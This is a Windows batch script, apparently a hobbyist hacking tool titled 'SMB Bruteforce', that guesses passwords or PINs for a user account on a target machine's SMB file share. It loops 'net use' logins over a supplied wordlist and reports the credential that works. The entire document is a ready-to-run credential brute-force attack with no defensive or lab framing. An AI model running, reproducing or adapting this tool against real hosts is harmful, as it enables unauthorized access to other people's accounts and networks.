@echo off
title SMB Bruteforce - by Ebola Man
color A
echo.

:: Prompting for user input
set /p ip="Enter IP Address: "
set /p user="Enter Username: "
set /p method="Enter method (password/pin): "

:: Checking selected method and prompting for the corresponding list
if /i "%method%"=="password" (
    set /p wordlist="Enter Password List: "
) else if /i "%method%"=="pin" (
    set /p pinlist="Enter PIN List: "
) else (
    echo Invalid method selected. Exiting...
    pause
    exit /b
)

:: Initializing attempt counter
set /a count=1

:: Looping through the password/PIN list and calling the attempt subroutine
if /i "%method%"=="password" (
    for /f %%a in (%wordlist%) do (
        call :attempt "%%a"
    )
) else if /i "%method%"=="pin" (
    for /f %%a in (%pinlist%) do (
        call :attempt "%%a"
    )
)

:: Displaying message if password/PIN not found
echo Password/PIN not Found :(
pause
exit /b

:: Subroutine for successful attempt
:success
echo.
echo Password/PIN Found! %pass%
net use \\%ip% /d /y >nul 2>&1
pause
exit /b

:: Subroutine for attempting to connect with password/PIN
:attempt
set pass=%~1
net use \\%ip% /user:%user% %pass% >nul 2>&1
echo [ATTEMPT %count%] [%pass%]
set /a count+=1
if %errorlevel% EQU 0 goto success
exit /b


